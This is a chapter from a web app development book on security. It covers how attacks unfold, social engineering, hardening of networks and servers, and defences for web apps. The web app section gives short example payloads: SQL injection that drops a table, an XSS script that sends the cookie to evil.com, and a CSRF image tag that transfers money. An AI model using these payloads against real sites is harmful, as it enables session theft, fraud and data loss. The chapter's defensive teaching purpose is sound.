##### Chapter 18

Security
========

Until now we’ve dedicated the bulk of our time to the selection, design
and implementation of web app features. The development process must
also consider *non-functional* aspects of the application, the most
important of which are security and performance.

Feature development is a relatively short-term investment that is
iterated to retain customers or capture additional market share.
Non-functional development is a long-term investment to enable growth,
protect the business and reputation, and alleviate legal issues. It too
requires frequent attention and is not simply a checklist to mark off
once at the start of a project.

\*I should more accurately call this **cracking**, but I’ll stick with
the term **hacking**.

A 2010 survey^[1](#fn1)^ found that one in six New York teenagers and
one in four UK teenagers admitted to hacking\*. There is surely no
scenario in which a teenager would ever lie, but even if you take these
numbers with a pinch of salt, there’s no escaping the fact that millions
of devious and bored hacker-wannabes have access to massive amounts of
inexpensive computer power and sophisticated software.

Anatomy of a web app attack
---------------------------

The typical web-based attack follows three steps: discovery,
exploitation and escalation.

In the initial discovery phase, the attacker profiles a system and
gathers information. They may try to locate unsecured test servers using
*DNS zone transfers*, perform *port scans* and *ping sweeps* to
determine potential access points, and identify what software versions
the server and web app are running through a variety of exposed
footprints, including HTTP headers and verbose error messages. They’ll
also run automated *fuzz testing*^[2](#fn2)^ software to pass invalid
and random data into your app to uncover easy security holes.

The attacker assesses the information and uses it to exploit the system
and gain access, perhaps through an unpatched web framework that
identifies its old version number in the HTML. Finally, having gained a
foothold in the system, the attacker attempts to escalate their
privileges to full administrator access. A security hole that allows the
user to display any server file to screen, for example, could be used to
view the database configuration file, whose connection settings may also
allow access to the main web server.

If a suitable exploit can’t be found, a malicious attacker with an
agenda may resort to a *denial of service* (DoS) attack. This floods the
web app servers with traffic in an effort to cripple the service under
load.

Attacks can be targeted at the app software, the server software, the
network software, the hardware or even at the people who work on the
app.

The layers of web app security

Social engineering hacks and countermeasures
--------------------------------------------

The easiest way into a system is to be given the keys. All the
technology security in the world won’t stop a hacker who has genuine
access to the system. Obtaining access credentials through personal
persuasion and manipulation is often referred to as *wetware* hacking,
rather than software or hardware hacking.

In the discovery phase the attacker undertakes reconnaissance on the
target, typically someone working on the app. Thanks to personal blogs,
public social media profiles and domain registration records, it can
take only a few minutes to identify addresses, service and utility
providers, birthdays, holiday schedules, phone numbers and the full
names of friends and family.

Armed with this information, the attacker exploits the target with
pretexting: inventing a fake scenario based on their current knowledge
of the target. This may be a phone call, email or online message from a
colleague or service provider, where the basic information is used to
establish a sense of authenticity and trust. This can be used to further
flesh out the information for a later and greater hack or, in the case
of *phishing*, it is used to ask outright for access credentials.

For example, it wouldn’t be difficult for an attacker to use social
media to discover that a target’s colleague is on vacation in Barbados;
they may even be able to download a recent photo of them on holiday.
Armed with this, the attacker could create an ostensibly authentic
online webmail account from which to email the target with, *“Greetings
from Barbados! PS I’ve forgotten my work email account details. Can you
reset them for me please?”* Once this has been granted, an escalation to
full access is straightforward.

There are several effective countermeasures against social hacking.

### Awareness

Ensure that everyone on the app team understands how social hacks work
and what they look like. As we’ll see, a fundamental rule of web
security is to never trust input, which extends to input from
telephones, emails and instant messages.

### Training

If you work in a large organisation, recognise that social hacks can
begin with anyone. Policies and training need to clarify which
information is sensitive, and how and when to check the validity of
someone’s identity. Be a good citizen and let your friends and family
know too.

### Privacy

Limit the amount of personal information that you put online and enable
privacy options where available.

### Passwords

Secure your computer by enabling a password-protected screensaver when
away from it, and disabling auto-login from reboots. Use keys^[3](#fn3)^
rather than passwords for server access to make it more difficult for an
attacker to overhear or sneakily read a password being typed in. To
control the damage of any breaches, use unique strong passwords for each
system: *don’t re-use passwords*. This is advice that everyone preaches
but few practise, but there is now little excuse thanks to password
manager applications like 1Password^[4](#fn4)^ that also synchronise
passwords between computers and mobile devices.

Network hacks and countermeasures
---------------------------------

Routers, switches and firewalls act as the first line of defence for
your app, protecting it from a deluge of unwanted probes and attacks.
It’s likely that you will initially host your app on a third-party
network, in which case the security of the network components lies
mostly outside of your control, except the choice of provider.

Attacks at this level commonly include physical tampering (to eavesdrop
on network traffic, perhaps) and exploitation of low-level protocols,
services and data.

\

Countermeasures that you should discuss with your provider, or implement
in-house when the time arrives include:

-   **Patches:** update firmware and other component software regularly.
-   **Security:** ensure adequate physical security and control access
    to the hardware.
-   **Passwords:** change all default component passwords to strong,
    unique passwords.
-   **Privacy:** remove component footprints and identifiers from
    outgoing messages.
-   **Blocks:** block and disable all unused ports, protocols and
    services. For example, disable FTP and Telnet ports and services in
    favour of SFTP and SSH.
-   **Filters:** block or filter low-level traffic that can be used in
    DoS attacks, such as ICMP messages^[5](#fn5)^.
-   **Logs:** log and regularly audit traffic, especially blocked and
    unusual requests.
-   **Detection:** implement an intrusion detection system (IDS) that
    detects attempted attacks and notifies an administrator.

Server hacks and countermeasures
--------------------------------

Web servers are powerful machines that host valuable websites and
databases. They also have fast access to the internet. As such they make
an attractive target to attackers and, given their mix of hardware and
complex software components, they make a large target to hit.

Most of the previous network countermeasures also apply to servers:
secure the physical hardware; use strong passwords or keys; remove
software footprints; disable unused services and ports; log traffic and
regularly patch the software.

Additionally, you should lock down the server software. The web server
(Apache, IIS and so on) should run as a non-root user, with the minimum
possible privileges. Grant the server access to files within the web
root only and ensure that only the root user can change the web server
configuration file. All other users on the server should be suitably
locked down.

Tweak the connection settings, if necessary. Optimum values will depend
on the amount and size of files that your app serves and requests from
users. Adjust the settings that control HTTP connections, such as the
valid maximum size of requests and the number of Keep-Alive requests per
connection. This can help the server to withstand DoS attacks.

Directory browsing and server-side includes should be disabled. Filter
some malevolent requests automatically with a module like mod\_security
(Apache) or UrlScan (IIS).

Web app hacks and countermeasures
---------------------------------

A web app exposes a minefield of vulnerabilities:

-   To identify the current user, the stateless nature of HTTP compels
    most apps to send a cookie from the browser to the app. This is
    frequently in plain text and across an unsecured connection.
-   An app must accept and process a wide variety of user input, and
    often shares the input with other users.
-   Apps are often built with third-party libraries, which may expose
    their own vulnerabilities. Similarly, apps increasingly rely on
    third-party services and APIs for content and functionality, which
    present additional routes into the system.
-   An app is responsible for the security of its user accounts and
    personal data. It must account for weak user passwords and poor user
    security decisions.

Web app attacks are not necessarily sophisticated. At least half of
2010’s most common vulnerabilities^[6](#fn6)^ were exploited through
simple manipulation of user input, including query string parameters and
HTTP headers.

### SQL injection

Most apps create dynamic SQL queries based on URL parameters or user
input. The URL *http://app.com/user/23* might be interpreted by the SQL
statement `SELECT * FROM user WHERE ID = $id` where the `$id` variable
is dynamically inserted from the URL by server-side code. The attacker
can manipulate the input value so that additional code is interpreted by
the SQL statement. For instance,
*http://app.com/user/23;+DROP+TABLE+user;* attempts to run a second
statement on the database to delete user data.

### Cross-site scripting (XSS)

Most apps incorporate data added by the user into the HTML. For example,
a search for the term *Dogtanian* might result in *“Your search for
Dogtanian returned 3 results”*. An attacker can manipulate this to
insert scripts into the HTML that run from the same origin as the main
website and, therefore, have access to trusted user data. An example
exploit search might be:

`Dogtanian<script>document.location='http://evil.com/log?cookie='+document.cookie</script>`

### Cross-site request forgery (CSRF)

As the name suggests, an attacker may imitate a request to the app from
an unsuspecting user while they browse another website. If an app uses
URLs for important actions (a GET HTTP request rather than a POST
request) and a cookie is trusted for authentication, it is exploitable.

\

For example, a link in an app to transfer money might have the URL:

\

*http://app.com/transfer?to=mother&amount=500*

\

…where the user cookie identifies who the request is from. An attacker
can copy a similar link to their website inside an image element, so
that the request to the app is unnoticeable:

`<img src="http://app.com/transfer?to=attacker&amount=500" />`

If a user who has been previously authenticated with the app visits the
attacker’s website, the browser will send the app’s authentication
cookie to the app when it requests the image, which triggers the app
into performing the attacker’s action.

### Session hijacking

If an attacker can monitor unsecured HTTP traffic between a user and the
app, they can capture the user’s cookie and use it in their own requests
to spoof the user’s session. This is easier than it sounds, as the
Firesheep^[7](#fn7)^ tool demonstrated: traffic on an open wireless
network is simple to intercept.

### Countermeasures

The most important defence against these attacks is to **never trust
input**. Assume that all input outside of your control is malicious,
including that from users, from HTTP headers and from third parties.

It is better to constrain valid input than to only check for malicious
input. If a user ID is always an integer between 1 and 10,000,000,
constrain the allowed values to this range. Constrain input by type
(integer, string and so on), length (number of characters) and format
(such as a valid email address). If it doesn’t match, reject it. Never
rely on client-side validation alone.

Log and reject invalid input. Check input for common hacker patterns in
multiple character encodings. This includes script elements, SQL
statements and file paths. Sanitise input before it is displayed in the
output. For example, a search string should rarely contain HTML code, so
strip the input of all markup and convert all HTML entities in the
output. Only use parameterised SQL queries and stored procedures, which
strictly sanitise SQL input.

Validate the source of input where possible. If you expect input from a
POST request, do not accept the same parameters from a GET request.
Consider checking the HTTP referrer, though this can be spoofed easily.
Similarly, consider including the IP address and user agent of the
authenticating user in their cookie identifier as a checksum (to be
checked on each subsequent request), taking into account that these too
can be spoofed and should not be solely relied on.

A better solution for important forms is to use a form token. At the
start of a user session, create a long random token for the user and
store it in their server-side session data. Include this token as a
hidden field in every POSTed form; if the token in a request doesn’t
match the server-side value, reject the request. To further enhance
security, make sure the token only works for a limited amount of time
before generating a new one.

Other important web app attack countermeasures:

-   Use a secure connection (HTTPS) for the transmission of sensitive
    data, including registration and login credentials.
-   Unless your JavaScript needs to access cookie information, add the
    HttpOnly parameter to the end of your Set-Cookie statements to
    enable HTTP-only cookies. This will prevent malicious JavaScript
    from gaining access to a user’s cookie data in most browsers.
-   If you decide to implement HTTPS by default across all pages of the
    app, add the Secure parameter to your Set-Cookie statement so that
    cookies are only sent for pages with secure connections.
-   Do not include sensitive information in cookie data.
-   Do not pass sensitive information in HTTP GET URLs.
-   Don’t rely on a cookie for identification when a user asks to change
    important data. Have the user reconfirm their current password in
    order to change their password, email address or other important
    information.
-   Do not use GET requests for important actions in the app. Any
    request that results in a change of data on the server should be
    performed by a POST only.
-   Create a database login for the app’s connection with the least
    amount of privileges possible. An app usually doesn’t need to
    create, drop or truncate tables, so remove those privileges.
-   Always explicitly set the character encoding of HTML output to
    prevent UTF-7 encoded hacks in Internet Explorer^[8](#fn8)^. You can
    also send an `X-Content-Type-Options: nosniff` header field to tell
    Internet Explorer not to guess the MIME-type of content.
-   Send an `X-Frame-Options` header field with a value of `SAMEORIGIN`
    or `DENY` to prevent other websites from mimicking your app by
    displaying your pages inside a frame.
-   Add the `autocomplete="off"` attribute to form fields that request
    sensitive information.
-   Never leak information in error messages. Always return a generic
    error page.
-   Keep third-party libraries up-to-date.
-   Never store a user password in plain text. Store a hash^[9](#fn9)^
    of the password and use the same hash algorithm to compare and
    verify the password when the user logs in. Do **not** use an MD5
    hash, which can be easily cracked with freely available rainbow
    tables^[10](#fn10)^. Instead, use a slower algorithm like
    bcrypt^[11](#fn11)^.
-   Enforce strong passwords. Sophisticated password encryption is
    worthless if the user chooses an easily guessable password. Don’t go
    over the top and insist on thirty-two obscure characters, but do
    require a minimum length of eight characters and at least one
    special character (@, $, and so on).

Summary
-------

Even the smallest web app faces attack from thousands of indiscriminate
hacking tools; put basic security measures in place to protect your app
and your users’ data.

-   Everyone working on the app should be aware of social hacks and how
    they work.
-   Ensure that your hosting provider is secure and that it keeps its
    systems updated.
-   Keep all software, including third-party libraries, updated.
-   Configure your web and database servers to minimise risk.
-   Never trust user input. Assume that all input can be malicious,
    including header information. Reject invalid input rather than
    trying to clean or convert it.
-   Never display raw user data to the screen: always sanitise it.
-   Use HTTPS for sensitive credentials, including login, registration
    and financial data.
-   Don’t let your users create weak passwords, and encrypt passwords
    with a slow algorithm like bcrypt.
